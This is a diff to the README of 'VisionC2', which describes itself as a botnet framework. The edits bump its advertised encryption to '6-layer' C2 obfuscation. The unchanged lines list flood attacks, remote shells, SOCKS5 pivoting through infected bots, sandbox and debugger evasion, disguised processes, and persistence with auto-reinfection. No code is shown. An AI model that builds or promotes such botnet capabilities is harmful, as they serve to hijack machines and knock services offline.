@@ -3,7 +3,7 @@
 
 # ☾℣☽ VisionC2
 
-**Multi-arch botnet framework with layered encryption (TLS 1.3 transport + AES-128-CTR string encryption + split-XOR keying) — 14-arch cross-compiled agents, L4/L7 floods, interactive remote shells, SOCKS5 proxying, and full persistence — driven through a real-time Go TUI**  
+**Multi-arch botnet framework with 6-layer encryption (TLS 1.3 transport + AES-128-CTR string encryption + 5-layer C2 obfuscation + split-XOR keying) — 14-arch cross-compiled agents, L4/L7 floods, interactive remote shells, SOCKS5 proxying, and full persistence — driven through a real-time Go TUI**
 
 ![Go](https://img.shields.io/badge/Go-1.24.0+-00ADD8?style=for-the-badge&logo=go)
 ![Platform](https://img.shields.io/badge/Platform-Linux-009688?style=for-the-badge&logo=linux&logoColor=white)
@@ -24,7 +24,7 @@
 | 🤖 | **CNC** | Full-featured TUI control panel built with BubbleTea |
 | 🔒 | **Communication** | Modern TLS 1.3 encrypted bot-to-server communication on port 443 (Indistinguishable from HTTPS traffic)|
 | ⚔️ | **Attack Methods** | Layer 4 (network) and Layer 7 (application) |
-| 🕵️ | **Evasion** | AES-128-CTR encrypted strings (zero sensitive plaintext in binary), 16-byte split XOR key, VM/sandbox/debugger detection (40+ signatures), 24-27h delayed exit on detection |
+| 🕵️ | **Evasion** | 6-layer C2 encryption (AES-128-CTR + 5-layer obfuscation), AES-128-CTR encrypted strings (zero sensitive plaintext in binary), 16-byte split XOR key, VM/sandbox/debugger detection (40+ signatures), 24-27h delayed exit on detection |
 | 👻 | **Stealth** | Unix daemonization, single-instance enforcement, disguised process names, PID lock |
 | ♻️ | **Persistence** | Systemd service + cron + rc.local, hidden directory with download script, auto-reinfection on reboot, cleanup tool included (`tools/cleanup.sh`) |
 | 🧦 | **SOCKS5 Proxy** | Full SOCKS5 pivoting through bots, RFC 1929 username/password auth, runtime credential updates |
@@ -165,7 +165,7 @@ Bot Binary
     ▼
 ┌─────────────────────────────────────────┐
 │      C2 Resolution & Connection         │
-│  - 5-layer C2 address decryption        │
+│  - 6-layer C2 address decryption        │
 │  - DNS Chain (DoH → UDP → A → Raw)     │
 │  - TLS 1.3 Handshake                     │
 │  - HMAC challenge/response auth         │
